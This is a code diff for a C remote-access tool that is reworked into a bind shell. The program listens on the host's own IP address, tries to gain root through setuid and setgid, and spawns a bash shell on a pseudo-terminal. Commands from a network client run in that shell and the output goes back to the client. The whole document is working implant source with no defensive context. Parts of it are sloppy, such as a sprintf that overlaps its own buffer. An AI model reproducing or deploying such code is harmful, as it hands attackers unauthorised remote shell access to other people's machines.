@@ -21,13 +21,31 @@
 
 static int	commandline_finished = 0;
 
-void	connect_to_server(s_ratz* ratz)
+char*	get_own_addr(void)
 {
-	if ((ratz->server = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	char			*ipv4;
+	char			buffer[256];
+	struct hostent	*hostaddr;
+
+	gethostname(buffer, sizeof(buffer));
+	hostaddr = gethostbyname(buffer);
+	ipv4 = inet_ntoa(*(struct in_addr *)hostaddr->h_addr_list[0]);
+	return (ipv4);
+}
+
+void	init_server(s_blue* blue)
+{
+	if ((blue->ratz.server = socket(AF_INET, SOCK_STREAM, 0)) == -1)
 		strexit("socket", 1);
-	ratz_set_addri(&ratz->addri, AF_INET, LOCALHOST, ratz->raw_port);
-	if (connect(ratz->server, (const s_sockaddr*)&ratz->addri, sizeof(ratz->addri)) == -1)
-		strexit("connect", 1);
+	write(1, blue->ratz.addr, strlen(blue->ratz.addr));
+	write(1, "\n", 1);
+	ratz_set_addri(&blue->ratz.addri, AF_INET, blue->ratz.addr, blue->ratz.raw_port);
+	if (bind(blue->ratz.server, (const s_sockaddr*)&blue->ratz.addri, sizeof(blue->ratz.addri)) == -1)
+		strexit("bind", 1);
+	else if (listen(blue->ratz.server, 1) == -1)
+		strexit("listen", 1);
+	else if ((blue->client = accept(blue->ratz.server, (s_sockaddr*)&blue->ratz.addri, &blue->ratz.addri_len)) == -1)
+		strexit("accept", 1);
 }
 
 void	create_ptm(s_blue* blue)
@@ -51,29 +69,34 @@ void	open_pts(s_blue* blue)
 
 // Le terminal associé au 'fd' devient le terminal de controle de la session
 static inline
-void	set_ttctrl(int fd)
+int	set_ttctrl(int fd)
 {
-	ioctl(fd, TIOCSCTTY, 0);
+	return (ioctl(fd, TIOCSCTTY, 0));
 }
 
 void	setup_slave(s_blue* blue)
 {
-	setsid(); // Détache le programme de l'ancienne session, auquel il devient maintenant le leader
+	if (setsid() == -1) // Détache le programme de l'ancienne session, auquel il devient maintenant le leader
+		blue->auth.setsid = 0;
 	open_pts(blue); // Ouvre le terminal esclave
-	set_ttctrl(blue->slave); // Le terminal associé au 'fd' devient le terminal de controle de la session
+	if (set_ttctrl(blue->slave) == -1) // Le terminal associé au 'fd' devient le terminal de controle de la session
+		blue->auth.ioctl = 0;
 }
 
 void	set_slave_state(int slave_fd)
 {
 	dup2(slave_fd, STDIN_FILENO);
 	dup2(slave_fd, STDOUT_FILENO);
-	//dup2(slave_fd, STDERR_FILENO);
+	dup2(slave_fd, STDERR_FILENO);
 	close(slave_fd);
 }
 
-int	try_set_root()
+void	try_set_root(s_auth* auth)
 {
-	return (setuid(0) | setgid(0));
+	if (setuid(0) == -1)
+		auth->pr = 0;
+	if (setgid(0) == -1)
+		auth->gr = 0;
 }
 
 char*	strjoin(char* a, char* b)
@@ -94,19 +117,66 @@ char*	strjoin(char* a, char* b)
 void	sigusr1_handling(int sig)
 {
 	if (sig == SIGUSR1)
-		commandline_finished = 1;
+		commandline_finished = 1;	
 }
 
-int	main(int, char** av)
+void	init_auth(s_auth* auth)
 {
-	try_set_root();
+	auth->pr = 1;
+	auth->gr = 1;
+	auth->ioctl = 1;
+	auth->setsid = 1;
+}
+
+void	send_auth_error(s_blue blue)
+{
+	char	auth_msg[11] = {0};
+	int		n = 0;
+
+	if (blue.auth.pr == 0)
+	{
+		auth_msg[0] = 'p';
+		auth_msg[1] = 'r';
+		n += 2;
+	}
+	if (blue.auth.gr == 0)
+	{
+		auth_msg[n + 0] = 'g';
+		auth_msg[n + 1] = 'r';
+		n += 2;
+	}
+	if (blue.auth.setsid == 0)
+	{
+		auth_msg[n + 0] = 's';
+		auth_msg[n + 1] = 'i';
+		auth_msg[n + 2] = 'd';
+		n += 3;
+	}
+	if (blue.auth.ioctl == 0)
+	{
+		auth_msg[n + 0] = 'c';
+		auth_msg[n + 1] = 't';
+		auth_msg[n + 2] = 'l';
+		n += 3;
+	}
+	printf("n : %d\n", n);
+	write(blue.client, auth_msg, 11);
+	write(blue.client, "\1", 2);
+}
+
+int	main(int unused, char** av)
+{
+	(void)unused;
 
 	int		chd;
 	s_blue	blue;
 	memset(&blue, 0, sizeof(blue));
 
+	init_auth(&blue.auth);
+	try_set_root(&blue.auth);
+	blue.ratz.addr = get_own_addr();
 	blue.ratz.raw_port = ratz__get_port_method(av[1]);
-	connect_to_server(&blue.ratz);
+	init_server(&blue);
 	create_ptm(&blue);
 
 	chd = fork();
@@ -118,7 +188,7 @@ int	main(int, char** av)
 		set_slave_state(blue.slave);
 		close(blue.ratz.server);
 		close(blue.master);
-		setenv("PS1", CTRL_PROMPT, 1);
+		setenv("PS1", "", 1);
 		setenv("TERM", "dumb", 1);
 		if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
 			strexit("execlp", 2);
@@ -129,29 +199,29 @@ int	main(int, char** av)
 		unlink("DEBUG.out");
 		close(blue.slave);
 		char	cmd[DEBUG_SIZE_MAX] = {0};
-		int		n;
-		fcntl(blue.ratz.server, F_SETFL, ~O_NONBLOCK);
+		int		n = 0;
+		fcntl(blue.client, F_SETFL, ~O_NONBLOCK);
 		fcntl(blue.master, F_SETFL, O_NONBLOCK);
+		send_auth_error(blue);
 		while (waitpid(chd, NULL, WNOHANG) == 0)
 		{
 			memset(cmd, 0, DEBUG_SIZE_MAX);
-			read(blue.ratz.server, cmd, DEBUG_SIZE_MAX);
+			read(blue.client, cmd, DEBUG_SIZE_MAX);
 			if (strcmp(cmd, "exit\n"))
 			{
-				n = sprintf(cmd, "%s ; kill -10 SIGUSR1 %d\n", cmd, getpid());
+				n = sprintf(cmd, "%s ; kill -10 %d\n", cmd, getpid());
 				cmd[n] = 0;
 			}
 			//write(2, "command debug : ", 17);
 			//write(2, cmd, strlen(cmd));
-			cmd[n] = 0;
 			write(blue.master, cmd, n);
 			while (commandline_finished == 0)
 				; // make a nanosleep
 			n = read(blue.master, cmd, DEBUG_SIZE_MAX);
-			commandline_finished = 0;
 			cmd[n] = '\0';
-			write(blue.ratz.server, cmd, n);
-			write(blue.ratz.server, "\001", 2);
+			commandline_finished = 0;
+			write(blue.client, cmd, n);
+			write(blue.client, "\001", 2);
 		}
 	}
 	return (0);
